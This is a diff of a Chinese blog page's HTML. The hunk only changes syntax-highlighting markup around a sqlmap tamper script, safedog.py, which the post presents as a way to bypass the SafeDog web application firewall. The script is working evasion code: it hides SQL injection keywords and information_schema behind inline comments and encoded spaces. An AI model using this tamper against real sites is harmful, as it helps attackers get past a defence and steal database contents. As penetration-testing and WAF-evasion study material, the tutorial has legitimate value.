@@ -145,24 +145,24 @@
 <p>我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。</p>
 <p>首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/d7beadfc-4f5e-11ec-8261-00d861bf4abb.jpg" alt="enter description here"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
-<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
-__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
-    <span style="color:#66d9ef">if</span> payload:
-		bypass_SafeDog_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*x^x*/&#34;</span>
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UNION&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;UNION&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SELECT&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;SELECT&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;AND&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;AND&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;=&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,bypass_SafeDog_str)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;information_schema.&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*!</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20INFOrMATION_SCHEMa</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20*/</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/&#34;</span>)
-		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;FROM&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;FROM&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
-		<span style="color:#75715e">#print &#34;[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version .&#34;</span>
-		print payload
-    <span style="color:#66d9ef">return</span> payload
-</code></pre></div><p>我们测试一下先不载入tamper脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+</span></span><span style="display:flex;"><span>__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> payload:
+</span></span><span style="display:flex;"><span>		bypass_SafeDog_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*x^x*/&#34;</span>
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UNION&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;UNION&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SELECT&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;SELECT&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;AND&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;AND&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;=&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;information_schema.&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*!</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20INFOrMATION_SCHEMa</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20*/</span><span style="color:#e6db74">%20%</span><span style="color:#e6db74">20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/&#34;</span>)
+</span></span><span style="display:flex;"><span>		payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;FROM&#34;</span>,bypass_SafeDog_str<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;FROM&#34;</span><span style="color:#f92672">+</span>bypass_SafeDog_str)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#print &#34;[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version .&#34;</span>
+</span></span><span style="display:flex;"><span>		print payload
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><p>我们测试一下先不载入tamper脚本：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/d804cdf0-4f5e-11ec-9841-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>到了这基本没戏了，我们看看拦截日志</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/d858aa10-4f5e-11ec-890f-00d861bf4abb.jpg" alt="enter description here"></p>
